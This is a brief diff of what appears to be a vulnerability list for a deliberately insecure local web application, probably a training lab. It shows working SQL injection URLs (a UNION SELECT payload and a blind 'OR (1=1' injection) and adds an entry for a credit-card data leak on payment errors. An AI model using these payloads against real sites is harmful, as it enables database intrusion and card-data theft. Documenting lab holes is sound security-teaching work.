@@ -20,3 +20,5 @@ http://localhost:4567/search?query='%29%20UNION%20SELECT%200,%20'Product SQLi',%
 
 Blind SQL injection
 http://localhost:4567/product?id[]=0%29%20OR%20%281=1
+
+CC data leak on payment processing error
